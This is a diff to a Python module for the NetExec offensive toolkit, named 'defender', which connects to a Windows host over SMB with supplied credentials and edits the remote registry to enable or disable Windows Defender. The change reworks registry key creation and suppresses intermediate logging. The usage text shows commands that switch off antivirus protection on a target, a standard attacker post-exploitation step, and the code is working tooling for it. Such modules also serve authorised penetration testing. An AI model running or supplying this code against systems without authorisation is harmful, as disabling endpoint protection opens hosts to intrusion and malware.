@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+import logging
 from sys import exit
 from impacket.dcerpc.v5 import rrp
 from impacket.examples.secretsdump import RemoteOperations
@@ -70,18 +71,18 @@ class NXCModule:
         Name: defender by @byinarie
         Description: Enables/Disables Windows Defender
         Supported Protocols: smb
-        
+
         Options:
           ACTION          Enable/Disable Windows Defender (choices: enable, disable)
-        
+
         Usage:
           nxc smb <target> -u <user> -p <password> -M defender -o ACTION=enable
           nxc smb <target> -u <user> -p <password> -M defender -o ACTION=disable
-          
+
           nxc smb <target> -id 1 -M defender -o ACTION=enable
           nxc smb <target> -id 1 -M defender -o ACTION=disable
         '''
-        
+
         if "ACTION" not in module_options:
             context.log.fail("ACTION option not specified!")
             print(NXCModule.help())
@@ -108,10 +109,10 @@ class NXCModule:
         Name: {cls.name}
         Description: {cls.description}
         Supported Protocols: {', '.join(cls.supported_protocols)}
-        
+
         Options:
           ACTION          Enable/Disable Windows Defender (choices: enable, disable)
-        
+
         Usage:
           nxc smb <target> -u <user> -p <password> -M defender -o ACTION=enable
           nxc smb <target> -u <user> -p <password> -M defender -o ACTION=disable
@@ -124,51 +125,49 @@ class Defender_SMB:
         self.__smbconnection = connection.conn
         self.logger = context.log
 
+        # Suppress intermediate logging messages
+        logging.getLogger().setLevel(logging.CRITICAL)
+
     def defender_Wrapper(self, action):
         remoteOps = RemoteOperations(self.__smbconnection, False)
         remoteOps.enableRegistry()
+
+        success = True  # Flag to track overall success
 
         if remoteOps._RemoteOperations__rrp:
             ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
             regHandle = ans["phKey"]
             registry_keys_to_set = ENABLE_REGISTRY_KEYS if action == "enable" else DISABLE_REGISTRY_KEYS
-
             success = self.set_registry_values(registry_keys_to_set, remoteOps, regHandle)
 
-            # Log the final success message
-            if success:
-                self.logger.success(f"Windows Defender {'Enabled' if action == 'enable' else 'Disabled'} on the host.")
-            else:
-                self.logger.error(f"Failed to fully {'enable' if action == 'enable' else 'disable'} Windows Defender.")
-
             remoteOps.finish()
+
+        if success:
+            self.logger.success(f"Windows Defender {action}d.")
+        else:
+            self.logger.error(f"Failed to {action} Windows Defender.")
 
     def set_registry_values(self, registry_keys_to_set, remoteOps, regHandle):
         success = True
         for full_key_path, keys in registry_keys_to_set.items():
-            try:
-                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, full_key_path)
-                keyHandle = ans["phkResult"]
-            except Exception as e:
-                self.logger.debug(f"Failed to open key {full_key_path}, Error: {str(e)}")
+            subkeys = full_key_path.split('\\')
+            current_handle = regHandle
+            for subkey in subkeys:
                 try:
-                    ans = rrp.hBaseRegCreateKey(remoteOps._RemoteOperations__rrp, regHandle, full_key_path)
-                    if "phKey" in ans:
-                        keyHandle = ans["phKey"]
-                        self.logger.debug(f"Created registry key {full_key_path} via SMB")
-                    else:
-                        raise Exception(f"Failed to retrieve key handle for {full_key_path}")
-                except Exception as e:
-                    self.logger.error(f"Error creating registry key {full_key_path}: {str(e)}")
-                    success = False
-                    continue
-
-            for key_name, value in keys.items():
-                try:
-                    rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, key_name, rrp.REG_DWORD, value)
-                    self.logger.debug(f"Modified {key_name} to {value} via SMB")
-                except Exception as e:
-                    self.logger.error(f"Error modifying {key_name}: {str(e)}")
-                    success = False
-
+                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, current_handle, subkey)
+                    current_handle = ans['phkResult']
+                except Exception:
+                    try:
+                        ans = rrp.hBaseRegCreateKey(remoteOps._RemoteOperations__rrp, current_handle, subkey)
+                        current_handle = ans['phkResult']
+                    except Exception:
+                        success = False
+                        break  # Cannot proceed without this key
+            else:
+                # Set the registry values if all keys were successfully opened/created
+                for key_name, value in keys.items():
+                    try:
+                        rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, current_handle, key_name, rrp.REG_DWORD, value)
+                    except Exception:
+                        success = False
         return success
